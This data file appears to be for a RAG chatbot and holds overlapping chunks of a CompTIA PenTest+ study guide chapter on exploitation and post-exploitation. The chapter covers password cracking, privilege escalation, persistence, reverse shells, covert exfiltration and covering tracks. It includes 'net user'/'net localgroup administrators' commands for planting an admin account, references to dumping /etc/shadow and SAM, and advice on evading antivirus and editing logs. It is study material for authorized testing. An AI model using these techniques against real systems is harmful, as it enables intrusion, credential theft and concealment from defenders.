rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Line Printer Daemon (LPD) Line Printer Daemon (LPD) is an older protocol service that allows for network printing between users, printer servers, physical printers, and the jobs that are sent to be printed. All of this used together allows for printing to take place, and LPD is often the protocol that allows for this functionality. LPD attacks can take place when an attacker exploits the vulnerabilities found in the LPD service. Various attack types can take place, including buffer overflows, where if enough data is sent to a print server for printing, it can lead to expose vulnerabilities and create a denial of service, or remote code execution where if an attack sends a maliciously crafted print job to the print server, they can further exploit the system. JetDirect JetDirect attacks are often directed at Hewlett‐Packard (HP)‐based print devices that allow for printing to take place. JetDirect systems are vulnerable if they are not secured properly and can lead to a large number of attacks. Some of these attacks can lead to arbitrary code execution, unauthorized access, path traversal, and countless other issues. If you have a JetDirect system on your network, you need to read the documentation directly from HP on how to specifically secure your version as they are also common jump points for pivoting as well. You can learn more about securing JetDirect directly from HP at https://h10032.www1.hp.com/ctg/Manual/c00746792.pdf. RDP Windows Remote Desktop Protocol (RDP) exploits are rare but powerful. The 2017 release of the EsteemAudit remote access exploit only worked on Windows 2003 and XP instead of modern Windows operating systems. Thus, most pentesters focus on existing accounts rather than the service itself as their target. Captured credentials and an accessible RDP (TCP/UDP port 3389) service provide a useful path into a Windows system, particularly Windows servers, which often use RDP as a remote administration access method. Apple Remote Desktop Remote access tools like RDP and ARD, Apple's Remote Desktop tool, provide a great way to get GUI access to a remote system, but when they are vulnerable, they can create an easy route in for attackers. Pentesters use ARD in two major ways. The first is via known vulnerable versions that can be exploited for access. Examples include the version built into macOS 10 High Sierra, which included a remote root exploit via Screen Sharing or Remote Management modes for ARD. Unfortunately for pentesters, most modern Macs are set to update automatically, making the vulnerability less likely to be available for many Macs, despite the existence of a Metasploit module that makes using the vulnerability easy. ARD is also useful as a remote access method for compromised macOS systems and may present a way for a pentester to log into a Mac remotely using captured credentials if the service is running and exposed in a way that you can get to it. VNC Virtual Network Computing (VNC) is another common remote desktop tool. There are quite a few variants of VNC, including versions for Windows, macOS,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Macs are set to update automatically, making the vulnerability less likely to be available for many Macs, despite the existence of a Metasploit module that makes using the vulnerability easy. ARD is also useful as a remote access method for compromised macOS systems and may present a way for a pentester to log into a Mac remotely using captured credentials if the service is running and exposed in a way that you can get to it. VNC Virtual Network Computing (VNC) is another common remote desktop tool. There are quite a few variants of VNC, including versions for Windows, macOS, and Linux. Like RDP and ARD, VNC provides a handy graphical remote access capability, but it may also have vulnerabilities that can be exploited, and it offers a way for an attacker to use captured credentials or to attempt to brute‐force a remote system. Metasploit also includes VNC payloads, making VNC one of the easier means of gaining a remote GUI when delivering a Metasploit payload. SSH SSH (Secure Shell) provides remote shell access via an encrypted connection. Exploiting it normally relies on one of two methods. The first looks for a vulnerable version of the SSH server. If the SSH server service is vulnerable, various issues can occur, including credential exposure or even remote access. Replacing the SSH server service with a Trojaned or modified version to capture credentials or provide silent access is also possible if you are able to gain sufficient access to a system. Another common SSH attack method is through the acquisition of SSH keys and their associated passphrases from compromised hosts or other exposures. SSH keys are often shared inside organizations, and once they are shared they often remain static without a regular change process. This means that capturing an SSH key, particularly one that is embedded into scripts or otherwise part of an organization's infrastructure, can result in long‐term access to the system or systems using that key. Since SSH keys that are shared sometimes have blank passphrases, or the passphrases are distributed with the shared key, even that layer of security is often compromised. Network Segmentation Testing and Exploits Networks are frequently logically segmented (separated) into multiple virtual local area networks (VLANs). This keeps traffic separated, often along trust domain or functional boundaries. These VLANs will have their own broadcast domain and IP ranges, and they will essentially operate like a separate network despite running on the same underlying physical network gear. Pentesters who gain access to one VLAN will often want to know if there are more VLANs and then may need to figure out how to access those VLANs to get more access. Since Payment Card Industry Data Security Standard (PCI DSS) requires penetration tests of segmentation controls on a regular basis, pentesters who work with PCI‐compliant organizations need to know how to test segmentation controls. Network segmentation can be tested by verifying that higher‐security zones don't communicate with lower‐security zones. That process often starts like a normal penetration test
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	network despite running on the same underlying physical network gear. Pentesters who gain access to one VLAN will often want to know if there are more VLANs and then may need to figure out how to access those VLANs to get more access. Since Payment Card Industry Data Security Standard (PCI DSS) requires penetration tests of segmentation controls on a regular basis, pentesters who work with PCI‐compliant organizations need to know how to test segmentation controls. Network segmentation can be tested by verifying that higher‐security zones don't communicate with lower‐security zones. That process often starts like a normal penetration test with port scanning to validate that lower‐security zones can't contact higher‐security zones. Validating firewall rules and dataflow are also common parts of this type of test. In addition to these checks, VLANs can be detected by sniffing traffic and looking for packets with VLAN information included in them like those with 802.1q tags. Separation of networks using firewalls, software‐defined networking, or even physical segmentation can be harder to observe and may require finding other clues such as documentation, network traffic, or IP addresses, or testing for firewall rules. Overcoming physical separation requires a completely different approach. Air‐gapped networks need physical action to move between network segments or zones. If you need to gain access to a network that is physically separate, you'll have to use social engineering or other human‐centric methods like malware transferred via flash drives by unsuspecting victims to get access to the other network. For most penetration tests, you'll focus on network attacks. Tools that allow VLAN hopping rely on one of the following: Double tagging to use 802.1q tags to send traffic to a target VLAN as the tags are stripped in transit by network devices Attempting to spoof switches into believing that they are a switch and should allow a trunked connection Leaked Keys Secret keys are used for a variety of purposes in systems and application architecture. They may be used to allow remote login, they can be used for application programming interfaces (APIs), or they can be used as access tokens. Pentesters now commonly look for exposed keys or attempt to acquire keys as part of their penetration testing efforts. Pentesters are on the hunt for secret keys because they're the keys that provide access to systems. Public keys are the other half of a keypair and can be safely exposed. That doesn't mean they're useless to pentesters. The existence of a public key can be a useful clue to go looking for a secret key in a location that makes sense for the purpose and owner of the public key. Tools like TruffleHog look for strings that match common formats for keys and then report the strings that they find. You can read more about TruffleHog at https://pypi.org/project/truffleHog. As a pentester, you should consider where keys may be unintentionally uploaded or included and where they are commonly stored. Unintentionally exposed keys are frequently found on GitHub or other code repository sites or
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	mean they're useless to pentesters. The existence of a public key can be a useful clue to go looking for a secret key in a location that makes sense for the purpose and owner of the public key. Tools like TruffleHog look for strings that match common formats for keys and then report the strings that they find. You can read more about TruffleHog at https://pypi.org/project/truffleHog. As a pentester, you should consider where keys may be unintentionally uploaded or included and where they are commonly stored. Unintentionally exposed keys are frequently found on GitHub or other code repository sites or in exposed Amazon S3 buckets. More protected keys may be found on systems that you compromise or gain access to as part of a penetration test, making the contents of user directories and profiles a potential treasure trove of access. Email, Slack, and other communications' methods may also contain keys. Leveraging Exploits Once they have successfully used an exploit and have access to a system, pentesters will typically investigate their options for lateral movement and post‐exploit attacks. Post‐exploit attacks may be aimed at information gathering, privilege escalation, or even lateral movement on the same host to gain a broader perspective or to attempt to test security boundaries that exist for the account or service that was originally exploited. Common Post‐Exploit Attacks There are many ways to conduct post‐exploit attacks that can provide further access or information. Understanding the basics of each of these techniques and when it is typically used can help you better deploy exploits. You may run across a cracking and attack tool called Cain and Abel while reading older security materials and briefings. The tool itself was popular for earlier versions of Windows up to Windows XP, but it is no longer useful for modern Windows systems, including Vista, 7, 8, and 10. Password attacks come in many forms, ranging from attacks against an authentication system or login page to attacks that are focused on captured credential stores and password files. Although acquiring a password without having to crack it is always preferable, sometimes the only way into a system is through a more direct password attack. Two of the most common attacks that don't rely on credential theft or social engineering are brute‐ forcing and the use of rainbow tables on password stores. Common methods of acquiring passwords from a compromised machine include these: pwdump and related utilities acquire Windows passwords from the Windows Security Account Manager (SAM). Information about user accounts on Linux or Unix systems can be obtained from /etc/passwd and the hashed values of the passwords from /etc/shadow. cachedump and creddump utilities focus on retrieving stored domain hashes, passwords, or other cached information from caches or the Windows Registry. SQL queries against system views or database administrative tables can provide information about users, rights, and passwords depending on the database and schema in use. Sniffing passwords on the wire is less frequently useful in modern networks because encryption is used for many, if
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	related utilities acquire Windows passwords from the Windows Security Account Manager (SAM). Information about user accounts on Linux or Unix systems can be obtained from /etc/passwd and the hashed values of the passwords from /etc/shadow. cachedump and creddump utilities focus on retrieving stored domain hashes, passwords, or other cached information from caches or the Windows Registry. SQL queries against system views or database administrative tables can provide information about users, rights, and passwords depending on the database and schema in use. Sniffing passwords on the wire is less frequently useful in modern networks because encryption is used for many, if not most, authentication systems. It remains a worthwhile tool to try if it's accessible, since sniffing traffic can help pentesters map networks and applications, and some credentials are still passed in plain text at times! Mimikatz Mimikatz is one of the premiere Windows post‐exploitation tools. Because of its broad utility and popularity, it is available in a variety of forms, including as a Meterpreter script, as a stand‐alone tool, and in modified forms in various PowerShell tools like Empire and PowerSploit. Mimikatz can retrieve cleartext passwords and NTLM hashes, conduct Golden Ticket attacks that make invalid Windows Kerberos sessions valid, and perform other functions that can make post‐exploitation Windows hacking a pentester's dream. The Offensive Security Metasploit Unleashed documentation includes a good introduction to the embedded version of Mimikatz at https://www.offensive-security.com/metasploit-unleashed/mimikatz. Credential brute‐forcing relies on automated tools to test username and password pairs until it is successful. There are quite a few tools that pentesters frequently use for this, including THC‐Hydra, John the Ripper, and Brutus. In addition, Metasploit includes a brute‐force capability as part of its toolkit. How you track and manage passwords is important for larger penetration tests where you may gather hundreds or thousands of passwords. Matching user accounts to passwords and hosts is also important, as credential reuse for further attacks is a powerful technique when targeting organizations. Using a tool like John the Ripper can be quite simple. Figure 6.16 shows John in use against an MD5‐hashed password file from the 2012 Crack Me If You Can competition using the RockYou word list, which is built into Kali Linux. FIGURE 6.16 John the Ripper Building a custom word list is a common technique when targeting a specific organization and can make documents and other data gathered during the information‐gathering stage more useful. Remember to pay attention to cracked and captured passwords to identify patterns, commonly reused passwords, and other information that may improve your password‐ cracking capabilities. If you want to try cracking a password file, the 2012 Crack Me If You Can files mentioned previously can be found at https://contest2012.korelogic.com. Instructions on how to use John the Ripper can be found at https://www.openwall.com/john. Dictionary attacks rely on a prebuilt dictionary of words like the RockYou (both versions 1 and 2) dictionary mentioned earlier. In many cases, pentesters will add additional organization‐specific dictionary entries to a dictionary file for their pentest based on knowledge they
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attention to cracked and captured passwords to identify patterns, commonly reused passwords, and other information that may improve your password‐ cracking capabilities. If you want to try cracking a password file, the 2012 Crack Me If You Can files mentioned previously can be found at https://contest2012.korelogic.com. Instructions on how to use John the Ripper can be found at https://www.openwall.com/john. Dictionary attacks rely on a prebuilt dictionary of words like the RockYou (both versions 1 and 2) dictionary mentioned earlier. In many cases, pentesters will add additional organization‐specific dictionary entries to a dictionary file for their pentest based on knowledge they have about the organization. If you know common words or phrases that are likely to be meaningful to staff at the target organization, such as a motto, popular figure or term, or even simply a bad habit of staff of the organization's help desk when they reset passwords, those can be very useful for this type of attack. If you don't have that type of information, there is good news: Many users who are allowed to set their own passwords use poor passwords, even with complexity rules, and as long as you're not fighting multifactor authentication, there's a good chance you'll be able to crack at least some passwords easily using a dictionary‐based attack! Rainbow tables provide a powerful way to attack hashed passwords by performing a lookup rather than trying to use brute force. A rainbow table is a precomputed listing of every possible password for a given set of password requirements, which has then been hashed based on a known hashing algorithm like MD5. Although hashes can't be reversed, this bypasses the problem by computing all possible hashes and then simply using a speedy lookup capability to find the hash and the password that was hashed to create it. Of course, if your target follows password hashing best practices and uses salts and purpose‐built password‐hashing algorithms, it is possible to make rainbow tables much harder to use, if not impossible. Fortunately for pentesters, that's not as common as it should be! Cross‐Compiling Cross‐compiling code is used when a target platform is running on a different architecture than the host that you can build an exploit on. During a penetration test, you may gain administrative access to an x86 architecture system and then need to deploy an exploit to an Android device running on an ARM64 platform. If you can't sneak the compiled binary for the exploit through your target's security, you may be able to transfer the source code— or even replicate it on the compromised remote system. If you're not familiar with the concept of password hashing, you'll want to read up on it, as well as password hashing and storage best practices. Despite years of best practice documentation like the OWASP Password Storage Cheat Sheet at https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat _Sheet.html and training for IT practitioners, organizations continue to use unsalted MD5 hashes for password storage, leading to massive breaches. The term cross‐compiling may make you think of “portable
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	can't sneak the compiled binary for the exploit through your target's security, you may be able to transfer the source code— or even replicate it on the compromised remote system. If you're not familiar with the concept of password hashing, you'll want to read up on it, as well as password hashing and storage best practices. Despite years of best practice documentation like the OWASP Password Storage Cheat Sheet at https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat _Sheet.html and training for IT practitioners, organizations continue to use unsalted MD5 hashes for password storage, leading to massive breaches. The term cross‐compiling may make you think of “portable code” that would run on multiple platforms. Actual cross‐compiling like gcc can compile to multiple architectures, but the binaries will only work on the target architecture. Privilege Escalation Privilege escalation attacks come in many forms, but they are frequently categorized into two major types: vertical and horizontal escalation. Vertical escalation attacks focus on attackers gaining higher privileges. It is important to remember that although going directly to administrative or root credentials is tempting, a roundabout attack that slowly gains greater access can have the same effect and may bypass controls that would stop an attack attempting to gain root access. Horizontal escalation attacks move sideways to other accounts or services that have the same level of privileges. Gaining access to other accounts is often aimed at accessing the data or specific rights that the account has rather than targeting advanced privileges. In addition to the targeting of the exploit, the exploit method used for privilege escalation is a useful distinction between escalation exploits. Common exploit targets include these: Kernel exploits, which are one of the most commonly used local exploit methods for vertical escalation. Many require local accounts and thus are less likely to be patched immediately by defenders who may focus on patching remote exploits and other critical vulnerabilities. Application and service exploits may target accounts that the service runs as or under, or they may target business logic or controls in the application or service itself. Database privilege escalation attacks may leverage SQL injection or other database software flaws to use elevated privilege or to query data from the database. Design and configuration issues can also allow privilege escalation, making it worth a pentester's time to validate which controls are applied to accounts and if accounts have rights or privileges that they wouldn't be expected to have. Many of the same techniques used by advanced persistent threat actors are useful for pentesters, and vice versa. If your persistence techniques aren't monitored for and detected by your client's systems, your findings should include information that can help them design around this potential issue. Social Engineering Technical exploitation methods can be highly effective, but humans remain the most vulnerable part of any environment. That means pentesters need to be ready to include social engineering in their test plan if it is allowed by the rules of engagement and included in the scope of work. The use of deception‐based techniques that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of the same techniques used by advanced persistent threat actors are useful for pentesters, and vice versa. If your persistence techniques aren't monitored for and detected by your client's systems, your findings should include information that can help them design around this potential issue. Social Engineering Technical exploitation methods can be highly effective, but humans remain the most vulnerable part of any environment. That means pentesters need to be ready to include social engineering in their test plan if it is allowed by the rules of engagement and included in the scope of work. The use of deception‐based techniques that leverage human weaknesses can provide access that bypasses technical security layers that cannot otherwise be overcome. Social engineering attacks against an organization may take a multitude of forms: Phone, email, social media, and SMS phishing for credentials or access On‐site attacks like impersonation of vendors, staff, or other trusted individuals or organizations Acquisition of information via dumpster diving Distribution of USB thumb drives or other devices containing Trojans or other attack software Social engineering techniques can significantly improve the personnel‐ related information provided in a penetration test report, and pentesters need to be aware of the potential advantages that the test brings. A social engineering test can provide information about employee behavior, policy compliance and enforcement, and security awareness in addition to the information and access that it may provide through an organization's security boundaries. Such tests can also be very challenging to do well, and they require a distinct skill set beyond technical penetration‐testing capabilities. Real World Scenario Scenario Part 2 Now that you have gained access to the vulnerable system you identified and exploited at the start of this chapter, you next need to ensure that you can retain access and avoid detection. Answer the following questions and practice the techniques you identify against the Metasploitable 3 virtual machine; then log in as an administrator or using the vagrant user, and verify that you do not see obvious signs of exploit in the service directory or elsewhere: How can you create a persistent service? What commands would you use to create the persistent service? What Metasploit payload best supports this? How can you best protect against detection by an antivirus tool like Windows Defender? What other evasion and cleanup techniques would you use to help avoid detection? Escaping and Upgrading Limited Shells A final technique you need to be aware of for post‐exploitation efforts is dealing with limited or restrictive shells. Limited shells attempt to prevent users who are assigned to use them from accessing commands that may allow exploits or abuse of the system, and they are commonly used on systems where there are concerns about external or unwanted access. Upgrading a restrictive shell requires leveraging potential weaknesses in the restricted shell environment. To achieve this, you need to assess the availability of common commands like ls, echo, and cd as well as programming languages like Perl and Python, and what commands are setuid commands or can
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	be aware of for post‐exploitation efforts is dealing with limited or restrictive shells. Limited shells attempt to prevent users who are assigned to use them from accessing commands that may allow exploits or abuse of the system, and they are commonly used on systems where there are concerns about external or unwanted access. Upgrading a restrictive shell requires leveraging potential weaknesses in the restricted shell environment. To achieve this, you need to assess the availability of common commands like ls, echo, and cd as well as programming languages like Perl and Python, and what commands are setuid commands or can be run as root using sudo. setuid lets users run programs with escalated privileges. Specific binaries on Linux and Unix systems can be set to setuid or setgid (group ID), allowing privilege escalation attacks, making binaries with this permission a sought‐after target for pentesters looking to try a privilege escalation attack or to escape a limited shell. Also note that GTFOBINS can be used to help identify those built‐in binaries that can be leveraged for priv‐esc in Linux. You can read a brief guide on shell upgrade techniques at https://www.exploit-db.com/docs/english/44592-linux-restricted-shellbypass-guide.pdf. Persistence and Evasion The ability to compromise a host is important, but the ability to retain access to the system to continue to gather data and to conduct further attacks is even more critical to most penetration attacks. That means persistence is a critical part of a pentester's efforts. Scheduled Jobs and Scheduled Tasks One of the simplest ways to maintain access to a system is via a scheduled job or task using the techniques we reviewed earlier in this chapter. An advantage of a scheduled action is that it can allow recurring callbacks to a remote system rather than requiring a detectable service to be run. This is the same reason many botnets rely on outbound SSL‐protected calls to remote web servers for their command and control. Using a secure protocol for the remote connection and ensuring that the system or systems to which the compromised host connects are not easily associated with the pentester's activities can help conceal the compromise. Inetd Modification The Inetd super daemon and its relatives (Xinetd, Rlinetd) run a variety of services on Linux systems. Adding additional services to Inetd can allow you to maintain a persistent connection via a service that you control, and subtle Inetd changes like changing the binary that provides a service may be missed by defenders. If the system you are attacking can easily be re‐exploited, you may not have to worry much about persistence—just repeat the attack that got you access last time! That's not always the case, though; systems may be patched at any time. That's when persistence is useful, including using tools like Metasploit's persistence tools. You can read more about Metasploit's persistence.rb, a Meterpreter service that will give you continued access to systems, at https://www.offensivesecurity.com/metasploit-unleashed/meterpreter-service. Daemons and Services Installing a fake service or inserting malicious code into an existing service in memory via a tool
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	a service may be missed by defenders. If the system you are attacking can easily be re‐exploited, you may not have to worry much about persistence—just repeat the attack that got you access last time! That's not always the case, though; systems may be patched at any time. That's when persistence is useful, including using tools like Metasploit's persistence tools. You can read more about Metasploit's persistence.rb, a Meterpreter service that will give you continued access to systems, at https://www.offensivesecurity.com/metasploit-unleashed/meterpreter-service. Daemons and Services Installing a fake service or inserting malicious code into an existing service in memory via a tool like Meterpreter can allow ongoing access to a system. Installing a daemon or service will provide longer access than code injected into memory, which won't survive reboots, but injected code is typically harder to detect. Backdoors and Trojans Backdoors and Trojans can also be used to provide persistence. Although purpose‐built backdoors can be a powerful tool, they're also more likely to be detected by antimalware tools. An alternate method of creating a backdoor is to replace an existing service with a vulnerable version. Once a vulnerable version is in place, you can simply exploit it, often without the system owner noticing the change in the executable or version. Remember that Trojans are defined as malware that is disguised as legitimate software. A backdoor is defined as a means of bypassing security controls and/or authentication. The PenTest+ exam outline specifically mentions both bind shells and reverse shells, and you will want to know what they are, how they differ, and when and why you might select each. A bind shell runs on a remote system and sets up a listener on a specific port allowing remote access. You then connect to the shell via a console tool like SSH or Netcat and execute commands on the remote system. Since this requires inbound connections, it is typically more likely to be detected as unusual activity by an IDS or IPS and may be blocked by firewalls that prohibit inbound connections to systems. A reverse shell connects from the remote system back to a system of your choice. This is a common option when a firewall prohibits you from sending traffic to a target system but allows internally initiated traffic out. If you've never tried it before, you may want to set up both a bind shell and a remote shell using Netcat. Check out the quick tutorial at https://www.hackingtutorials.org/networking/hacking-netcat-part-2bind-reverse-shells for an easy set of instructions. A final method that attackers can use is direct code modification for web applications, scripts, and other tools where the code is accessible on the system. Removing input validation from web applications, adding vulnerable code or remote access tools, or making similar changes can provide pentesters with ongoing access or alternate access methods. Data Exfiltration and Covert Channels Once you gain access to data during a penetration test, the next step is often to figure out how to get the data out of the system or network
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Check out the quick tutorial at https://www.hackingtutorials.org/networking/hacking-netcat-part-2bind-reverse-shells for an easy set of instructions. A final method that attackers can use is direct code modification for web applications, scripts, and other tools where the code is accessible on the system. Removing input validation from web applications, adding vulnerable code or remote access tools, or making similar changes can provide pentesters with ongoing access or alternate access methods. Data Exfiltration and Covert Channels Once you gain access to data during a penetration test, the next step is often to figure out how to get the data out of the system or network that you've compromised. That process is known as data exfiltration. Exfiltration can be as simple as sending data back to a system you control but can also be a complex activity in well‐defended or challenging networks. Defenders may be watching for exfiltration using a variety of techniques, including looking for specific content, unexpected or uncharacteristic flows or traffic patterns, and a variety of other methods. This means that as a pentester you need to carefully consider how you can get data out without being detected. Common exfiltration techniques include covert channels (channels that allow the transfer of data against policy) like hiding data in encrypted web traffic to innocuous‐appearing or commonly used sites like Google, GitHub, or even YouTube, Facebook, or Instagram, where steganography techniques that hide data in images or video may be used, sending data via email, or by abusing protocols like DNS. You can find a useful list to get you thinking about data exfiltration possibilities at https://www.pentestpartners.com/security-blog/data-exfiltration-techniques. When you consider exfiltration techniques you should think about how defenders may be looking for data that may be leaving the organization. Exfiltrating data without being detected is most likely to be successful if you make it hard to determine that the data leaving belongs to the organization or is sensitive using techniques that use secure protocols, data encryption or encoding (which can easily be done with native tools like PowerShell), if the transfer method looks innocuous, and where the traffic is going. Thus, smaller data transfers of encoded data via HTTPS to a site like GitHub or Facebook are more likely to pass unnoticed than a large data transfer via SSH to an unknown host. The PenTest+ exam outline specifically calls out steganography as a technique you need to be aware of. Steganography is a technique that hides data in another form like an image, audio file, or video. Although steganography is relatively uncommon in practice, you should make sure you recognize the term and are aware that you may be tested on the concept. Other methods of using covert channels are using email as a method of using a channel that allow the transfer of data against policy like sending and receiving of files, especially using email accounts that are not business‐ related internally to your network like Google Gmail. Another method is using cloud storage. There are so many forms of cloud storage that can be
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	data in another form like an image, audio file, or video. Although steganography is relatively uncommon in practice, you should make sure you recognize the term and are aware that you may be tested on the concept. Other methods of using covert channels are using email as a method of using a channel that allow the transfer of data against policy like sending and receiving of files, especially using email accounts that are not business‐ related internally to your network like Google Gmail. Another method is using cloud storage. There are so many forms of cloud storage that can be used as a covert channel such as Dropbox as an example. This provides an attack vector but also an exfiltration path. The use of virtual drive mounting can also resemble a useful covert channel specifically because it is storage‐ based and often used temporarily. This drive (and directory) can be brought online and then back offline quickly hiding the attackers' tracks. Text storage sites can also be used as a form of storage that can be used as a covert channel. Internet Control Message Protocol (ICMP) can also be used as a covert channel. Due to how ICMP is designed, it can in fact be used as a covert storage channel for when data is stored in ICMP packets that can be captured and certain fields that contain inherent flaws allow for information leakage. New Users Creation of a new user account is a tried‐and‐true method for retaining access to a system. In well‐managed and monitored environments, adding an account is likely to be caught and result in an alarm, but in many environments creation of a local user account on a system may allow ongoing access to the system, device, or application. Metasploit's Meterpreter makes this very easy on a compromised Windows system if you have an account with administrative privileges. Simply executing net user [newusername] [password] add and net localgroup administrators [newusername] /add will result in the creation of user accounts. Metasploit also includes payloads that are designed to add a UID 0 user (root‐level access) to Linux, but this type of action is also simple to do from the command line once you have a privileged account or sudo rights. Concealing new user creation can be difficult, but carefully selecting the new user account's name to match the names of existing or common services or other users who have local accounts can help conceal both the use of the account and any actions the account takes. Security incident responders who are responding to a breach will commonly check for new user accounts by reviewing the Windows SAM or the Linux password file. Some pentesters (and attackers) may attempt to conceal their presence by modifying these files to make evidence like the creation order or date of the new account less obvious. Covering Your Tracks An important post‐exploit task is cleaning up the tools, logs, and other traces that the exploit process may have left on the target
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	who have local accounts can help conceal both the use of the account and any actions the account takes. Security incident responders who are responding to a breach will commonly check for new user accounts by reviewing the Windows SAM or the Linux password file. Some pentesters (and attackers) may attempt to conceal their presence by modifying these files to make evidence like the creation order or date of the new account less obvious. Covering Your Tracks An important post‐exploit task is cleaning up the tools, logs, and other traces that the exploit process may have left on the target machine. This can be very simple or quite complex, depending on the techniques that were used, the configuration and capabilities of the target system, and the tools that were needed to complete the attack. One of the first steps you should consider when covering your tracks is how to make the tools, daemons, or Trojans that you will use for long‐term access appear to be innocuous. Some tools like Meterpreter do this by inserting themselves into existing processes, using names similar to common harmless processes, or otherwise working to blend in with the normal behaviors and files found on the system. It can be difficult, if not impossible, to conceal all of the tools required to compromise and retain access to a system. In cases where it is possible that your tools may be discovered, encryption and encoding tools like packers, polymorphic tools that change code so that it cannot be easily detected the same as other versions of the same attack tools, and similar techniques can help slow down defenders. The same techniques used by advanced persistent threats and major malware packages to avoid detection and prevent analysis can be useful to pentesters because their goal is similar. In addition to hiding the tools and other artifacts required to retain access, cleanup is important. Pentesters need to know where the files that their attacks and actions created will be and should ensure that those files have been removed. You also need to track the log files that may contain evidence of your actions. Although it may be tempting to wipe the log files, empty log files are far more suspicious than modified log files in most cases. If the target organization uses a remote logging facility, you may not be able to effectively remove all log‐based evidence, and the difference between local and remote logs can indicate compromise if staff at the target notice the changes. This means that most practitioners first choose to modify logs or clean them if possible, and then use log wiping only if they don't have another option. Concealing communications between the target system and a pentester's workstation, or between multiple compromised systems, is also a key part of covering your tracks. The same techniques used by advanced malware are useful here, too. A combination of encrypted communications, use of common protocols, and ensuring that outbound communication travels to otherwise innocuous hosts can help
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	difference between local and remote logs can indicate compromise if staff at the target notice the changes. This means that most practitioners first choose to modify logs or clean them if possible, and then use log wiping only if they don't have another option. Concealing communications between the target system and a pentester's workstation, or between multiple compromised systems, is also a key part of covering your tracks. The same techniques used by advanced malware are useful here, too. A combination of encrypted communications, use of common protocols, and ensuring that outbound communication travels to otherwise innocuous hosts can help prevent detection. A direct RDP session in from the pentester's workstation after performing a series of port and vulnerability scans is much more likely to be detected by a reasonably competent security team! In a penetration test conducted against an organization with a strong security team, you may need to use more advanced techniques. Although they're beyond the scope of the PenTest+ exam and this book, anti‐analysis and anti‐forensic tools like packers and other encoders, as well as other techniques and applications, may be useful. Advanced Penetration Testing: Hacking the World's Most Secured Networks by Wil Allsopp (Wiley, 2017) is a good book to start with if you want to learn more. Summary Once a pentester has gathered vulnerability information about a target, the next step is to map those vulnerabilities to potential exploits. Vulnerability and exploit databases both allow pentesters to match the vulnerabilities that they discover to exploits, whereas tools like Metasploit provide ratings for prebuilt exploit packages that allow testers to select the exploits that are most likely to succeed. Creating and maintaining a foothold requires tools like backdoors or Trojans that can provide shell or even graphical remote access. Pentesters often leverage either bind shells that open a listener on a chosen port or reverse shells that connect to a system controlled by the pentester. They may also choose to leverage daemons and scheduled tasks to ensure that even if their shell is terminated, a new shell or other backdoor will be restarted at a known time or when the system is rebooted. Once you have successfully exploited one or more systems and have gained a foothold inside an organization, post‐exploitation activities begin. A first step is to attempt lateral and vertical movement to other systems and devices that may only be accessible from inside the organization. Pentesters should also consider additional information gathering and vulnerability assessment from their new vantage point, since most systems and networks focus more on outside attackers than those inside of security boundaries due to the need for internal users to perform their jobs. Pentesters may also need to tackle tasks like testing network segmentation or upgrading limited shells as they explore the environments they have gained access to. Avoiding detection throughout these processes is important so that you'll have continued access to the systems you have compromised. The PenTest+ exam focuses on fileless malware that injects into already running processes
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	organization. Pentesters should also consider additional information gathering and vulnerability assessment from their new vantage point, since most systems and networks focus more on outside attackers than those inside of security boundaries due to the need for internal users to perform their jobs. Pentesters may also need to tackle tasks like testing network segmentation or upgrading limited shells as they explore the environments they have gained access to. Avoiding detection throughout these processes is important so that you'll have continued access to the systems you have compromised. The PenTest+ exam focuses on fileless malware that injects into already running processes rather than leaving artifacts on the target system. Once there, living off the land is accomplished by using built‐in tools and kits like PsExec, WMI, and PowerShell as well as many common Linux utilities. Once you have acquired data, you need to consider exfiltration—how you will get the data back to systems you control without being detected. This can involve techniques like the use of steganography to embed data in otherwise innocuous images, video, or audio, or it can involve encoding, encryption, and the use of covert channels to conceal outbound data. You will have to consider both the quantity and type of data and the potential defenses and detection mechanisms that defenders have in place that could detect and prevent your exfiltration efforts. Post‐exploitation activities also include cleanup, concealment, and retaining access for longer‐term penetration testing activities. You should make sure you know how to hide the evidence of your actions by cleaning up log files, removing the files created by your tools, and ensuring that other artifacts are not easily discoverable by defenders. Techniques like encryption, secure communications, and building scripted callbacks are all important to concealing and retaining long‐term access. Exam Essentials Understand post‐exploitation tools and techniques. Pentesters need to know how to use tools like Empire, Mimikatz, and BloodHound to continue their exploits. These tools can allow lateral movement to other accounts and systems with similar privilege levels and access, including the use of pass‐the‐hash techniques. They can also help with privilege escalation horizontally by gaining access to similar accounts, or through vertical escalation to more powerful accounts like administrator accounts. Explain enumeration techniques. Enumerating new targets is an important task for pentesters who gain access to their targets. Common enumeration targets included in the PenTest+ exam outline include users, groups, forests, sensitive data, and unencrypted data. Pentesters need to know the basics of how these can be enumerated and why each is an important target. Explain how to create a foothold and maintain persistence. Once you have access to a system, you need to create and maintain a foothold. That means using tools that can provide remote access like Trojans and backdoors that provide remote shell access. Other techniques like the use of daemons that run automatically at system startup and schedule tasks that put remote access back in place on a scheduled basis are also important for pentesters to be aware of. Knowing when
